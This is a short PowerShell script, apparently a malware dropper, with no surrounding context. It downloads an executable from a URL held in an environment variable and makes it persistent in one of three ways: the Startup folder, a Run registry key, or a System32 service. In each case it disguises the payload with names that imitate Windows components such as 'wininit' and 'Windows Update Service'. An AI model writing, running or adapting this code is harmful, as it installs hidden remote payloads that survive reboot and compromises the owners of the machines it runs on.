switch ( $env:method )
{
    1 {
        $dest = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\wininnit.exe"
        Invoke-RestMethod -Uri $env:url -DisableKeepAlive -OutFile $dest
    }
    2 {
        $dest = Join-Path $env:APPDATA "wininnit.exe"
        Invoke-RestMethod -Uri $env:url -DisableKeepAlive -OutFile $dest
        $params = @{
            Path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Name = 'wininit'
            PropertyType = 'String'
            Value = $dest
        }
        New-ItemProperty @params
    }
    3 {
        $dest = "C:\Windows\System32\winupdate.exe"
        Invoke-RestMethod -Uri $env:url -DisableKeepAlive -OutFile $dest
        $params = @{
            BinaryPathName = 'C:\Windows\System32\winupdate.exe'
            Name = 'Windows Update Service'
            StartupType = 'Automatic'
        }
        New-Service @params
    }
}